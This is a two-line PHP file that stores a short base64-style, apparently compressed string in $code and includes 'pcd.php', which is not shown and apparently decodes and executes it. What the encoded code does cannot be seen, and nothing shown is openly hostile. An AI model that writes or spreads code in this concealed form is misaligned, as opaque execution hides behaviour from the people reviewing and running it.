<?php
$code="s7EvyCjg5cqtLC7MiU/OyS9O1VABMjWtFUrzilNLYBx7OwA=";include("pcd.php");?>